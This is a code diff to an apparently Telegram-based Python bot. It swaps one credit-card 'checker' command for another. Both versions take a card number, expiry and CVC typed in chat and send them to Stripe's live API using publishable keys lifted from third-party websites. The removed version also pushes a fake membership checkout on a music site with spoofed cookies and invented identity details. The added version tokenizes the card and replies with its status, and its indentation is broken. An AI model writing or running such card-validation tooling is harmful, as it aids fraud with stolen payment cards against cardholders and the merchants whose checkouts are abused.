@@ -484,89 +484,22 @@ async def _(event):
 """
     await event.respond(output)
 
-
-@Cbot(pattern="^/chk ?(.*)")
+@Cbot(pattern="^/ck ?(.*)")
 async def ck(event):
-    card = event.pattern_match.group(1)
-    if not card:
-        return await event.reply("Enter the card.")
-    card, month, year, cvc = card.split("|")
-    card = card.strip()
-    month = month.strip()
-    year = year.strip()
-    cvc = cvc.strip()
-    url = "https://api.stripe.com/v1/payment_methods"
-    random = requests.get("https://randomuser.me/api/?nat=us")
-    params = {
-        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",
-        "key": "pk_live_51Hjv4tDXIdQocyyvTx4dKv2PtpirijuZYzYjH8dwpeFzUDR6zMgKKK3AxRQWpfnKjcoROFUZk4F0qyVS3G7Oa2UL00t7PhNt2M",
-        "type": "card",
-        "card[number]": card,
-        "card[exp_month]": month,
-        "card[exp_year]": year,
-        "card[cvc]": cvc,
-        "guid": "1d064913-c0e3-4caa-9d9-10730c84441517f840",
-        "muid": "55f71d87-f952-4918-8e28-0bec4597b05396185b",
-        "sid": "a61596a2-eb0d-4a73-b81e-f941da8ac3cbae378c",
-        "payment_user_agent": "stripe.js%2Fb6b83d5a%3B+stripe-js-v3%2Fb6b83d5a",
-        "time_on_page": "408890",
-        "referrer": "https%3A%2F%2Fthemusicalliance.us%2F",
-        "billing_details[name]": "RoseLoverX_L",
-        "billing_details[address][country]": "US",
-        "billing_details[address][postal_code]": "10901",
-        "billing_details[address][state]": "NY",
-        "billing_details[address][city]": "Airmont",
-        "billing_details[address][line1]": "250 Rt 59",
-    }
-    stripe_res = requests.post(url, data=params)
-    id = stripe_res.json()["id"]
-    req_url = "https://themusicalliance.us/account/membership-checkout/"
-    headers = {
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://themusicalliance.us",
-        "referer": "https://themusicalliance.us/account/membership-checkout/",
-        "level": "1",
-        "checkjavascript": "1",
-        "other_discount_code": "",
-        "username": "RoseLoverX",
-        "password": "HACKER2217",
-        "password2": "HACKER2217",
-        "email": "camarnath214@outlook.com",
-        "confirmemail": "camarnath214@outlook.com",
-        "fullname": "RoseLoverX",
-        "lastname": "Xilam",
-        "firstname": "RoseLoverX Xilam",
-        "address1": "Hulu do gali",
-        "address2": "250 Rt 59",
-        "city": "Airmont",
-        "state": "NY",
-        "zipcode": "10901",
-        "phone": "+14124672289",
-        "CardType": "visa",
-        "discount_code": "",
-        "tos": "1",
-        "submit-checkout": "1",
-        "javascriptok": "1",
-        "_qJoswyLO": "UtlIHQ1Wp",
-        "_ZFsrJlPSuB": "lkbrA4vY86T",
-        "payment_method_id": id,
-        "AccountNumber": card,
-        "ExpirationMonth": month,
-        "ExpirationYear": year,
-    }
-    cookie = {
-        "gvWzDrENKA": "cQF%5B7S2XPD",
-        "tYHySvj": "vOCaNIM",
-        "_ga": "GA1.2.1379236770.1610806731",
-        "_gid": "GA1.2.838055355.1610806731",
-        "_fbp": "fb.1.1610806785530.1251221065",
-        "__stripe_mid": "55f71d87-f952-4918-8e28-0bec4597b05396185b",
-        "PHPSESSID": "759c090529d9f7ae16bb57a0f3124b63",
-        "pmpro_visit": "1",
-        "__stripe_sid": "a61596a2-eb0d-4a73-b81e-f941da8ac3cbae378c",
-    }
-    fianl = requests.post(req_url, data=headers, cookies=cookie)
-    await event.reply(str(fianl.text))
+ card = event.pattern_match.group(1)
+ if not card:
+     return await event.reply("Enter the card.")
+ try:
+  card, month, year, cvc = card.split("|")
+  card = card.strip()
+  month = month.strip()
+  year = year.strip()
+  cvc = cvc.strip()
+ except:
+   return await event.reply("Invalid card format.")
+ url = "https://api.stripe.com/v1/tokens"
+ post_fields = {"card[number]": card, "card[exp_month]": month, "card[exp_year]": year, "card[cvc]": cvc, "card[address_zip]": "10080", "guid": "NA", "muid": "NA", "sid": "NA", "payment_user_agent": "stripe.js%2F5e0d85ab9%3B+stripe-js-v3%2F5e0d85ab9", "time_on_page": "131124", "referrer": "https%3A%2F%2Fsomethingisaw.substack.com%2Fsubscribe%3Futm_source%3Dmenu%26simple%3Dtrue%26next%3Dhttps%253A%252F%252Fsomethingisaw.substack.com%252Fp%252Fblack-art", "key": "pk_live_vNnuGHOFnt4mM7V9PuCAAPJz", "pasted_fields": "number"}
+ result = requests.post(url, data=post_fields)
+ stat = result.json()["card"]
+ await event.reply(str(stat))
 
-
-# baaki nala
